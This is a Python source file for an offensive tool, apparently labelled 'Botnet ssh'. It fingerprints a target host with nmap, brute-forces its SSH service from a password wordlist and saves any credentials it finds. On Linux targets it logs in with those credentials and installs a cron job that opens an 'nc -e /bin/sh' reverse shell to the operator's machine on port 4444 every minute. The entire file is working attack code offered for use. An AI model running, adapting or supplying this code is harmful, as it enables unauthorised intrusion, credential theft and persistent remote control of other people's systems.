import nmap
import optparse
import time
import socket
from sys import argv
from os import path
from colorama import init, Fore
from pexpect import pxssh

# Colorama
init(autoreset=True)

# Brute force SSH
Found = False
Fails = 0
os = "Unknow"

ssh_info = None

# Export file
export_file = None

# FONCTIONS
def get_host_ip():
    """Get the host's ip"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host_ip = s.getsockname()[0]
    s.close()

    return host_ip
    
def persist_shell_linux(host):
    """This fonction sets a reverseshell on port 4444 with crontab on a linux based system"""
    global ssh_info
    
    try:
        s = pxssh.pxssh()
        s.login(host, ssh_info['user'], ssh_info['password'])
        host_ip = get_host_ip()

        crontab_str = f'(crontab -l 2>/dev/null; echo "* * * * * nc -e /bin/sh {host_ip} 4444") | crontab -'

        s.sendline(crontab_str)
        s.logout()

        print(f"{Fore.BLUE}[Botnet ssh] {Fore.LIGHTGREEN_EX}Reverse shell 60-second intervals is set on port {Fore.MAGENTA}4444. "\
                f"{Fore.BLUE}Enter the following command : {Fore.YELLOW}nc -lnvp 4444")

    except pxssh.ExceptionPxssh as e:
        print(f"{Fore.LIGHTRED_EX}[ERROR] Connection failed!")


def detect_os(host):
    """Gess the Os of the target"""
    global os

    try:
        nm = nmap.PortScanner()
        nm.scan(host, arguments="-O --osscan-guess")
        os = nm[host]['osmatch'][0]['name']
    except nmap.nmap.PortScannerError:
        print(f"{Fore.LIGHTRED_EX}[ERROR] You need to run the command with root privilege!")
        exit(0)


def verif_file(filename):
    """Verifies if the argument is an acceptable name and with a good extension"""
    splited_filename = filename.split('.')
    if len(splited_filename) == 1:
        print(f"{Fore.LIGHTRED_EX}[Erreur] : Merci de mettre un nom de fichier avec une extension '.txt' ")
        exit(0)
    else:
        global export_file
        export_file = filename

def write_export(ip, port, user, password):
    """Writes into a file the credentials of the account"""
    global export_file
    with open(export_file, 'w') as f:
        f.write(f'Host : {ip} port : {port}\n')
        f.write(f'User : {user} Password : {password}')
        f.close()


def connect(host, user, password):
    """Connects to target host with credentials"""
    global Found
    global Fails
    global ssh_info

    try:
        ssh = pxssh.pxssh()
        ssh.login(host, user, password, login_timeout=60, auto_prompt_reset=False, port=ssh_info['port'])
        print(f"{Fore.BLUE}[{Fore.YELLOW}+{Fore.BLUE}] {Fore.MAGENTA}Password {Fore.LIGHTGREEN_EX}Found: {password}")
        Found = True
        ssh_info['password'] = password
        ssh_info['user'] = user
        ssh.logout()
    except pxssh.ExceptionPxssh as e:
        print(f"{Fore.BLUE}[{Fore.YELLOW}-{Fore.BLUE}] {Fore.MAGENTA}Password {Fore.RED}Incorrect {Fore.YELLOW}{password}")
        Fails += 1
        # time.sleep(1)    

def brute_force_ssh(host):
    """Performs brute force on the target on the ssh service"""
    global Found
    global ssh_info
    global Fails
    global export_file

    username = None
    
    # Get the username
    while username == None or ' ' in username:
        username = input(f"{Fore.BLUE}Write the {Fore.MAGENTA}username{Fore.BLUE}: ") 
   
    print("") # separator of a new line
    try:
        wordlist = open("passwords.lst", "r")
        while True:
            psswd = str(wordlist.readline().strip('\r').strip('\n'))
            if Found:
                print("\n")
                print(f"{Fore.BLUE}[Botnet ssh] {Fore.LIGHTGREEN_EX}Access granted {Fore.BLUE}for {Fore.MAGENTA}user "\
                        f"{Fore.BLUE}= {Fore.YELLOW}{username} {Fore.BLUE}and {Fore.MAGENTA}password {Fore.BLUE}= {Fore.YELLOW}{ssh_info['password']} "\
                        f"{Fore.BLUE}in {Fore.WHITE}{Fails} {Fore.BLUE}attempt(s)")
                
                if export_file != None:
                    write_export(ip=host, user=username, password=ssh_info['password'], port=ssh_info['port'])
                
                # Reverse shell on linux target
                if "linux" in os.lower():
                    persist_shell_linux(host)
                exit(0)
            connect(host, username, psswd)

            if not psswd:
                print(f"{Fore.BLUE}End of file, {Fore.MAGENTA}password {Fore.RED}not found !")
                break
    except FileNotFoundError:
        print(f"{Fore.RED}[ERROR] Wordlist not found!")


def nmapScan(tgtHost, tgtPort):
    """Scans the port in argument and shows its service"""
    nScan = nmap.PortScanner()
    nScan.scan(tgtHost, tgtPort)
    
    # Try if the host is reachable
    try:
        state = nScan[tgtHost]['tcp'][int(tgtPort)]['state']
        name = nScan[tgtHost]['tcp'][int(tgtPort)]['name']
        product = nScan[tgtHost]['tcp'][int(tgtPort)]['product']
        version = nScan[tgtHost]['tcp'][int(tgtPort)]['version']
    except KeyError:
        print(f"{Fore.RED}[ERROR] Host is unreachable!")
        exit(0)

    # Find the ssh port
    if ((name == "ssh" or product == "OpenSSH") and state == 'open'):
        global ssh_info
        ssh_info = {
                'port': tgtPort,
                'product': product,
                'version': version}
    print(f"{Fore.BLUE}[{Fore.YELLOW}{'+' if state == 'open' else '-'}{Fore.BLUE}] {tgtHost} tcp/{tgtPort} {Fore.LIGHTGREEN_EX if state == 'open' else Fore.RED}{state}")

# MAIN

def main():
    """Main fonction"""
    global ssh_info
    global os

    prog = path.basename(argv[0]) # Get program name

    usage = f"[Usage]: {prog} -H <target host> -p <target port>"
    parser = optparse.OptionParser(usage=usage) # Initialize parser
    
    parser.add_option('-H', dest='tgtHost', type='string', \
            help='specify target host\'s IP address.')

    parser.add_option('-p', dest='tgtPort', type='string', \
            help='specify target port[s] eparated by comma. Or put - for range: 21-25.')
    
    parser.add_option('-o', dest='output_file', type='string', \
            help='specify destination file', default=None)

    # Gather options
    (options, args) = parser.parse_args()

    # Check if export
    if options.output_file != None:
        verif_file(options.output_file)
    
    # Set target host
    tgtHost = options.tgtHost
    
    # Check if all requirements are satisfied
    if tgtHost == None or options.tgtPort == None:
        print(parser.usage)
        exit(0)

    detect_os(tgtHost)

    # Check if it's ranged port
    if '-' in options.tgtPort and options.tgtPort != None:
        range_list = options.tgtPort.split('-')
        ports = ""
        for i in range(int(range_list[0]), int(range_list[1]) + 1):
            ports += f"{i}," if i != int(range_list[1]) else f"{i}"
        tgtPorts = ports.split(',')
    else:
        tgtPorts = str(options.tgtPort).split(',')
    
    print('-'*100)
    print(f'Host : {tgtHost}')
    print(f'Os : {os}')
    print("Port(s) : ", end="")
    print(*tgtPorts, sep=', ')
    print("") # separator of a new line

    for port in tgtPorts:
        nmapScan(tgtHost, port)
    if ssh_info != None:
        # print SSH informations
        print(f"\n{Fore.MAGENTA}SSH service {Fore.BLUE}seems to be {Fore.GREEN}active{Fore.BLUE}.")
        print(f"{Fore.CYAN}Port: {Fore.YELLOW}tcp/{ssh_info['port']}")
        print(f"{Fore.CYAN}Service: {Fore.YELLOW}{ssh_info['product']}")
        print(f"{Fore.CYAN}Version: {Fore.YELLOW}{ssh_info['version']}")
        answer = "None"
        while answer.upper() != 'Y' and answer.upper() != 'N':
            answer = input(f"\n{Fore.BLUE}Would you like to perform a brute force attack on this {Fore.WHITE}target {Fore.BLUE}and {Fore.WHITE}port {Fore.BLUE}? (y/n): ")
        if answer.upper() == 'Y':
            brute_force_ssh(tgtHost)
        else:
            exit(0)
     

if __name__ == "__main__":
    main()
